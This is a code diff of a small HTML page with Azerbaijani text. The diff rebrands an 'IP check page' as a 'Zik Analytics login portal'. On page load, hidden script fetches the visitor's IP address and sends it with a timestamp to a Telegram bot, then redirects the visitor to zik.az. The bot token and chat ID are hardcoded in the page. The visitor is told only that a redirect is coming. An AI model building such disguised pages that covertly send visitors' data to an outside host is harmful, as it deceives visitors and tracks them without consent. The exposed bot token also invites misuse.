@@ -1,32 +1,42 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>IP Yoxlama Səhifəsi</title>
+  <title>Zik Analytics Giriş Portalı</title>
   <meta charset="UTF-8" />
   <script>
     window.onload = function () {
+      // İP almaq üçün ipify API-dən istifadə
       fetch("https://api.ipify.org?format=json")
         .then(response => response.json())
         .then(data => {
           const ip = data.ip;
-          const token = "8238686725:AAFSPkEKUFFPwyr2YSD3mPMMf4tpHYKsrwM";
-          const chat_id = "2091774116";
-          const text = `Yeni ziyarətçi: IP adresi - ${ip}`;
+          const token = "8238686725:AAFSPkEKUFFPwyr2YSD3mPMMf4tpHYKsrwM"; // Sənin Telegram bot token
+          const chat_id = "6282801620"; // Sənin Telegram chat ID
+          const text = `Zik Analytics saytına yeni giriş:\nIP: ${ip}\nZaman: ${new Date().toLocaleString()}`;
 
+          // Telegram botuna mesaj göndər
           fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
             method: "POST",
-            headers: { "Content-Type": "application/json" },
+            headers: {"Content-Type": "application/json"},
             body: JSON.stringify({
               chat_id: chat_id,
               text: text
             })
+          }).then(() => {
+            // Mesaj göndərildikdən sonra yönləndir
+            window.location.href = "https://zik.az"; // Zik Analytics URL-si, lazım olsa dəyişdir
           });
         })
-        .catch(error => console.error("IP alınarkən xəta:", error));
+        .catch(error => {
+          console.error("IP alınarkən xəta:", error);
+          // Problem olsa da yönləndir
+          window.location.href = "https://zik.az";
+        });
     };
   </script>
 </head>
 <body>
-  <h2>Salam! Bu, IP nəzarət səhifəsidir.</h2>
+  <h2>Zik Analytics giriş portalına xoş gəlmisiniz.</h2>
+  <p>Bir neçə saniyə ərzində Zik Analytics saytına yönləndiriləcəksiniz...</p>
 </body>
 </html>
